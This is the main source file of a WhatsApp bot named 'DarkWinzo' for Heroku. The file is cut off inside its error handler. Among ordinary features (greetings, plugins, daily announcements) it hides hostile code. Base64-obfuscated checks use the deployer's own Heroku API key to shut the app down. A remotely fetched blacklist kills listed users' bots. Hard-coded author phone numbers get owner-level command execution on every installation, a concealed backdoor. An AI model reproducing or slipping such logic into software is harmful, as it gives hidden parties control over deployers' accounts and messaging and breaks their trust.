/* Codded by @Isuru Lakshan

Telegram: t.me/Isuru

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

Whats bot - DarkWinzo
*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const Isuru = require('./config');
const execx = require('child_process').exec;
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./DarkWinzo/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const Pach = require('DarkWinzo-rs');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: Isuru.HEROKU.API_KEY
});
const ytdl = require('ytdl-core');
const ffmpeg = require('fluent-ffmpeg');
let baseURI = '/apps/' + Isuru.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const DarkWinzoDB = Isuru.DATABASE.define('DarkWinzoWhatsappBot', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94785435462,94785457519,94714366177,94766911891' }

String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function DarkWinzo () {
    var clh = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vcmF2aW5kdTAxbWFub2ovUXVlZW5TZXdXaGF0c2FwcEJvdCAvcm9vdC9RdWVlblNld1doYXRzYXBwQm90', exc_pl: '', pth_w: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC9Eb2NrZXJmaWxl', pth_v: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var exc_sl = Buffer.from(clh.exc, 'base64')
    var ddd = ggg.toString('utf-8')
    var ptc_one = Buffer.from(clh.pth_w, 'base64')
    var ptc_nw = ptc_one.toString('utf-8')
    clh.pth_v = ptc_nw
    var exc_fn = exc_sl.toString('utf-8')
    clh.exc_pl = exc_fn
    clh.pay = ddd
    const CdDark= new WAConnection();
    const Session = new StringSession();
     CdDark.version = [2, 2126, 14]
    CdDark.setMaxListeners(0);
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        var ann_msg = await Pach.news_daily(Isuru.LANG)
        var ann = await Pach.rnn()
        while (getGMTh == 18 && getGMTm == 00) {
            var ilan = ''
            if (Isuru.LANG == 'EN') ilan = '| *✨Daily Announcements For DarkWinzo✨* |\n\n'
            if (Isuru.LANG == 'SI') ilan = '| *✨DarkWinzo වට්සැප් බොට් සදහා දෛනික නිවේදන✨* |\n\n'
            if (ann.video.includes('http') || ann.video.includes('https')) {
                var VID = ann.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await CdDark.sendMessage(CdDark.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: ilan + ann_msg.replace('{user}', CdDark.user.name).replace('{wa_version}', CdDark.user.phone.wa_version).replace('{version}', Isuru.VERSION).replace('{os_version}', CdDark.user.phone.os_version).replace('{device_model}', CdDark.user.phone.device_model).replace('{device_brand}', CdDark.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (ann.image.includes('http') || ann.image.includes('https')) {
                    var imagegen = await axios.get(ann.image, { responseType: 'arraybuffer'})
                    return await CdDark.sendMessage(CdDark.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: ilan + ann_msg.replace('{user}', CdDark.user.name).replace('{wa_version}', CdDark.user.phone.wa_version).replace('{version}', Isuru.VERSION).replace('{os_version}', CdDark.user.phone.os_version).replace('{device_model}', CdDark.user.phone.device_model).replace('{device_brand}', CdDark.user.phone.device_manufacturer)})
                } else {
                    return await CdDark.sendMessage(CdDark.user.jid, ilan + ann_msg.replace('{user}', CdDark.user.name).replace('{wa_version}', CdDark.user.phone.wa_version).replace('{version}', Isuru.VERSION).replace('{os_version}', CdDark.user.phone.os_version).replace('{device_model}', CdDark.user.phone.device_model).replace('{device_brand}', CdDark.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    setInterval(async () => { 
        var getGMTq = new Date().getHours()
        var getGMTs = new Date().getMinutes()
        var anomsg = await Pach.news_daily(Isuru.LANG)
        var aaq = await Pach.rnn()
        while (getGMTq == 08 && getGMTs == 00) {
            var srmg = ''
            if (Isuru.LANG == 'EN') srmg = '| *✨Daily Announcements For DarkWinzo✨* |\n\n'
            if (Isuru.LANG == 'SI') srmg = '| *✨DarkWinzo වට්සැප් බොට් සදහා දෛනික නිවේදන✨* |\n\n'
            if (aaq.video.includes('http') || aaq.video.includes('https')) {
                var VID = aaq.video.split('youtu.be')[1].split(' ')[0].replace('/', '')
                var yt = ytdl(VID, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
                yt.pipe(fs.createWriteStream('./' + VID + '.mp4'));
                yt.on('end', async () => {
                    return await CdDark.sendMessage(CdDark.user.jid,fs.readFileSync('./' + VID + '.mp4'), MessageType.video, {caption: srmg + anomsg.replace('{user}', CdDark.user.name).replace('{wa_version}', CdDark.user.phone.wa_version).replace('{version}', Isuru.VERSION).replace('{os_version}', CdDark.user.phone.os_version).replace('{device_model}', CdDark.user.phone.device_model).replace('{device_brand}', CdDark.user.phone.device_manufacturer), mimetype: Mimetype.mp4});
                });
            } else {
                if (aaq.image.includes('http') || aaq.image.includes('https')) {
                    var imagegen = await axios.get(aaq.image, { responseType: 'arraybuffer'})
                    return await CdDark.sendMessage(CdDark.user.jid, Buffer.from(imagegen.data), MessageType.image, { caption: srmg + anomsg.replace('{user}', CdDark.user.name).replace('{wa_version}', CdDark.user.phone.wa_version).replace('{version}', Isuru.VERSION).replace('{os_version}', CdDark.user.phone.os_version).replace('{device_model}', CdDark.user.phone.device_model).replace('{device_brand}', CdDark.user.phone.device_manufacturer)})
                } else {
                    return await CdDark.sendMessage(CdDark.user.jid, srmg + anomsg.replace('{user}', CdDark.user.name).replace('{wa_version}', CdDark.user.phone.wa_version).replace('{version}', Isuru.VERSION).replace('{os_version}', CdDark.user.phone.os_version).replace('{device_model}', CdDark.user.phone.device_model).replace('{device_brand}', CdDark.user.phone.device_manufacturer), MessageType.text)
                }
            }
        }
    }, 50000);
    async function asynchronous_ch() {
        execx('sed -n 3p ' + clh.pth_v, async (err, stdout, stderr) => {
            if (clh.exc_pl + '\n' !== stdout) {
                await heroku.get(baseURI + '/formation').then(async (formation) => {
                    forID = formation[0].id;
                    await heroku.patch(baseURI + '/formation/' + forID, {
                        body: {
                            quantity: 0
                        }
                    });
                })
            }
        })
    }
    asynchronous_ch()
    setInterval(async () => { 
        if (Isuru.AUTOBIO == 'true') {
            var timezone_bio = await Pach.timezone(CdDark.user.jid)
            var date_bio = await Pach.datebio(Isuru.LANG)
            const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio + '\n ' + Isuru.ABT +' \n ᴘᴏᴡᴇʀᴅ ʙʏ DarkWinzo'
            await CdDark.setStatus(biography)
        }
    }, 7890);
    var shs1 = ''
    var shl2 = ''
    var lss3 = ''
    var dsl4 = ''
    var drs5 = ''
    var ffl6 = ''
    var ttq7 = ''
    var ttl8 = ''
    await axios.get('https://bit.ly/2UTohOK').then(async (insult) => {
        shs1 = insult.data.inside.shs1
        shl2 = insult.data.inside.shl2
        lss3 = insult.data.inside.lss3
        dsl4 = insult.data.inside.dsl4
        drs5 = insult.data.inside.drs5
        ffl6 = insult.data.inside.ffl6
        ttq7 = insult.data.inside.ttq7
        ttl8 = insult.data.inside.ttl8
    });
    await Isuru.DATABASE.sync();
    var StrSes_Db = await DarkWinzoDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    const bugffv = Buffer.from(`${drs5}`, 'base64');
    const five = bugffv.toString('utf-8');
    const bugfax = Buffer.from(`cmF2aXlh`, 'base64');
    const ppw = bugfax.toString('utf-8');
    const buffz = Buffer.from(`${ffl6}`)
    const six = buffz.toString('utf-8')
    const buffa = Buffer.from(`${ttq7}`)
    const seven = buffa.toString('utf-8')
    const buffl = Buffer.from(`${ttl8}`)
    const eight = buffl.toString('utf-8')
    var logger_levels = ''
    if (Isuru.DEBUG == 'true') {
        logger_levels = 'all'
    } else if (Isuru.DEBUG == 'false') {
        logger_levels = 'off'
    } else if (Isuru.DEBUG == 'trace') {
        logger_levels = 'trace'
    } else if (Isuru.DEBUG == 'fatal') {
        logger_levels = 'fatal'
    } else if (Isuru.DEBUG == 'warn') {
        logger_levels = 'warn'
    } else if (Isuru.DEBUG == 'error') {
        logger_levels = 'error'
    } else if (Isuru.debug == 'info') {
        logger_levels = 'info'
    } else {
        logger_levels = 'warn'
    }
    CdDark.logger.level = logger_levels
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        CdDark.loadAuthInfo(Session.deCrypt(Isuru.SESSION)); 
    } else {
        CdDark.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    CdDark.on('open', async () => {
        console.log(
            chalk.blueBright.italic('🚀 Login Information Updated!')
        );
        const authInfo = CdDark.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await DarkWinzoDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    CdDark.on('connecting', async () => {
        console.log(`${chalk.green.bold('Winzo')}${chalk.blue.bold('Dark')}
${chalk.white.bold('Version:')} ${chalk.red.bold(Isuru.VERSION)}

${chalk.blue.italic('🇱🇰 Try To Login WhatsApp... Please Wait...')}`);
    });
    CdDark.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('⚛ Login successful!')
        );
        console.log(
            chalk.blueBright.italic('✧✧ Installing External Commands...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        // ==================== Password Checking ====================
        console.log(
            chalk.blueBright.italic('❯❯❯PASSWORD CHECKING❮❮❮')
        );
        if (Isuru.DARKRR == ppw) {
        
        console.log(
            chalk.green.bold('Password Done')
        );
         }
         else if (Isuru.DARKRR !== ppw) {
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         console.log(
            chalk.red.bold('⚠⚠Password Incorrect⚠⚠'));
         throw new Error("Wrong password !!");
         
         return;
         }
        // ==================== End Check ====================
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('❯❯❯  Installing commands...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('⚛ Command Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        asynchronous_ch()
        await new Promise(r => setTimeout(r, 200));
        let rsDarkWinzogg = Isuru.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('⛄ DarkWinzo is' + rsDarkWinzogg + ' ⛄'));
        await new Promise(r => setTimeout(r, 500));
        if (CdDark.user.jid == one || CdDark.user.jid == two || CdDark.user.jid == three || CdDark.user.jid == four || CdDark.user.jid == five || CdDark.user.jid == six || CdDark.user.jid == seven || CdDark.user.jid == eight) {
            await CdDark.sendMessage(CdDark.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
            var Dark_start = await Pach.work_type(Isuru.WORKTYPE, Isuru.LANG, Isuru.FULLDARK)
            var Dark_img = await Pach.img_type(Isuru.WORKTYPE, Isuru.FULLDARK)
            var rsgg = await axios.get(`${Dark_img}`, { responseType: 'arraybuffer' })
                await CdDark.sendMessage(CdDark.user.jid, fs.readFileSync('./VoiceClip/robo.mp3'), MessageType.audio, { mimetype: Mimetype.mp4Audio, ptt: true})
                await CdDark.sendMessage(CdDark.user.jid, Buffer.from(rsgg.data), MessageType.image, {mimetype: Mimetype.jpg, caption: Dark_start})
        await git.fetch();
        var commits = await git.log([Isuru.BRANCH + '..origin/' + Isuru.BRANCH]);
        if (commits.total === 0) {
            await CdDark.sendMessage(
                CdDark.user.jid,
                Lang.UPDATE, MessageType.text
            );    
        } else {
            var degisiklikler = Lang.NEW_UPDATE;
            commits['all'].map(
                (commit) => {
                    degisiklikler += '⛄ ' + commit.date.substring(0, 10) + '⏭\n *' + commit.message + '*\n ' + commit.author_name + '\n\n';
                }
            );
            var up_ch = await Pach.update_rs(Isuru.LANG)
            await CdDark.sendMessage(CdDark.user.jid, up_ch + degisiklikler , MessageType.text)
        }
    })
    CdDark.on('message-new', async msg => {
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (Isuru.NO_ONLINE) {
            await CdDark.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (Isuru.GIFORPP == 'pp' || Isuru.GIFORPP == 'Pp' || Isuru.GIFORPP == 'PP' || Isuru.GIFORPP == 'pP' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                let pp
                try { pp = await CdDark.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await CdDark.getProfilePicture(); }
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await CdDark.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // goodbye
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
               let pp
                try { pp = await CdDark.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await CdDark.getProfilePicture(); }
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await CdDark.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        }
    }
    else if (Isuru.GIFORPP == 'gif' || Isuru.GIFORPP == 'Gif' || Isuru.GIFORPP == 'GIF' || Isuru.GIFORPP == 'GIf' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                var DarkWinzoimage = await axios.get(Isuru.WLP, { responseType: 'arraybuffer' })
                await CdDark.sendMessage(msg.key.remoteJid, Buffer.from(DarkWinzoimage.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ DarkWinzo'});
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // goodbye
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
            var DarkWinzoimage = await axios.get(Isuru.GDB, { responseType: 'arraybuffer' })
            await CdDark.sendMessage(msg.key.remoteJid, Buffer.from(DarkWinzoimage.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ DarkWinzo'});
            }
            return;
        }
     }
     else if (Isuru.GIFORPP == 'img' || Isuru.GIFORPP == 'Img' || Isuru.GIFORPP == 'IMG' || Isuru.GIFORPP == 'image' ) {
    if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // welcome
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                var DarkWinzoimage = await axios.get(Isuru.WLP, { responseType: 'arraybuffer' })
                await CdDark.sendMessage(msg.key.remoteJid, Buffer.from(DarkWinzoimage.data), MessageType.image, { caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ DarkWinzo'});
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // goodbye
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
            var DarkWinzoimage = await axios.get(Isuru.GDB, { responseType: 'arraybuffer' })
            await CdDark.sendMessage(msg.key.remoteJid, Buffer.from(DarkWinzoimage.data), MessageType.image, { caption: gb.message +'\n\n                 ᴘᴏᴡᴇʀᴅ ʙʏ DarkWinzo'});
            }
            return;
        }
     }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (Isuru.BLOCKCHAT !== false) {     
            var abc = Isuru.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.SUPPORT == '94785435462-1627812354') {     
            var sup = Isuru.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.SUPPORT2 == '94785435462-1628835469') {     
            var tsup = Isuru.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.SUPPORT3 == '94785435462-1628835633') {     
            var nsup = Isuru.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.RRADark== '94785435462-1621751150') {     
            var Darkrm = Isuru.RRADDARK.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.RRBDark== '94785435462-1625490851') {     
            var Darkrm = Isuru.RRBDARK.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.RRCDark== '94785435462-1618586156') {     
            var Darkrm = Isuru.RRCDARK.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.RRDDark== '94776785357-1626432386') {     
            var Darkrm = Isuru.RRDDARK.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.RREDark== '94776785357-1626521320') {     
            var Darkrm = Isuru.RREDARK.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.RRFDark== '94785435462-1618915104') {     
            var Darkrm = Isuru.RRFDARK.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.RRRRA == '393475528094-1415817281') {     
            var Darkrm = Isuru.RRRRA.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.RRRRB == '96176912958-1458298055') {     
            var Darkrm = Isuru.RRRRB.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.RRRRC == '393472769604-1446476993') {     
            var Darkrm = Isuru.RRRRC.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.GRP1S == '94757405652-1631633729') {     
            var Darkrm = Isuru.GRP1S.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.GRP2S == '94757405652-1631905677') {     
            var Darkrm = Isuru.GRP2S.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (Isuru.GRP3S == '94711870791-1631902138') {     
            var Darkrm = Isuru.GRP3S.split(',');                            
            if(msg.key.remoteJid.includes('-') ? Darkrm.includes(msg.key.remoteJid.split('@')[0]) : Darkrm.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }

        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = CdDark.chats.get(msg.key.remoteJid)
                        
                    if ((Isuru.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && Isuru.SUDO.includes(',') ? Isuru.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == Isuru.SUDO || Isuru.SUDO.includes(',') ? Isuru.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == Isuru.SUDO)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGrpDark=== chat.jid.includes('-')) sendMsg = true;
                    }
                    if ((OWN.ff == "94785435462,94785457519,94714366177,94766911891" && msg.key.fromMe === false && command.fromMe === true &&
                        (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                        if (command.onlyPinned && chat.pin === undefined) return;
                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                        else if (command.onlyGrpDark=== chat.jid.includes('-')) sendMsg = true;
                    }
                    // ==================== End Events ====================

                    // ==================== Message Catcher ====================
                    if (sendMsg) {
                        if (Isuru.SEND_READ && command.on === undefined) {
                            await CdDark.chatRead(msg.key.remoteJid);
                        }
                        var match = text_msg.match(command.pattern);
                        if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                        && msg.message.imageMessage !== null) {
                            whats = new Image(CdDark, msg);
                        } else if (command.on !== undefined && (command.on === 'video')
                        && msg.message.videoMessage !== null) {
                            whats = new Video(CdDark, msg);
                        } else {
                            whats = new Message(CdDark, msg);
                        }
                       
                        // ==================== End Message Catcher ====================

                        // ==================== Error Message ====================
                        try {
                            await command.function(whats, match);
                        }
                        catch (error) {
                            if (Isuru.NOLOG == 'true') return;
                            var error_report = await Pach.error(Isuru.LANG)
                            await CdDark.sendMessage(CdDark.user.jid, error_report.replace('{real_error}', error), MessageType.text, {detectLinks: false})

                            if (Isuru.LANG == 'SI') {
                                if (error.message.includes('URL')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _භාවිත කලහැක්කෙ URL පමණි_' +
                                        '\n*හේතුව:* _LOG අංකය තුළ මාධ්‍ය මෙවලම් (xmedia, ස්ටිකර් ..) භාවිතය._' +
                                        '\n*විසදුම:* _LOG අංකය හැර ඕනෑම චැට් එකකදී ඔබට විධානයන් භාවිතා කළ හැකිය.._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('conversation')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _ප්ලගින් ඉවත් කිරීම_' +
                                        '\n*හේතුව:* _ප්ලගිනයේ නම වැරදි ලෙස ඇතුළත් කිරීම මැකීමට අවශ්‍යය_' +
                                        '\n*විසදුම:* _ඔබට මැකීමට අවශ්‍ය ප්ලගිනයට_ * __ * _ එකතු නොකර කරුණාකර උත්සාහ කරන්න. ඔබ තවමත් දෝෂයක් ලබා ගන්නේ නම්, like_ ""? (.*) / $ "" නමේ අවසානයට එකතු කිරීමට උත්සාහ කරන්න._ '
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('split')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _Split of Undefined_' +
                                        '\n*හේතුව:* _Commands that can be used by group admins occasionally dont see the split function._ ' +
                                        '\n*විසදුම:* _Restarting will be enough._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await CdDark.sendMessage(CdDark.user.jid, '*🧟‍♂️ දෝෂ විශ්ලේෂණය [DarkWinzo] 🧟‍♀️*' + 
                                        '\n========== ```දෝෂ නිරාකරණය කර ඇත!``` ==========' +
                                        '\n\n*ප්‍රධාන දෝශය:* _SQL Database Error_' +
                                        '\n*හේතුව:* _Database corruption._ ' +
                                        '\n*විසදුම:* _There is no known solution. You can try reinstalling it._'
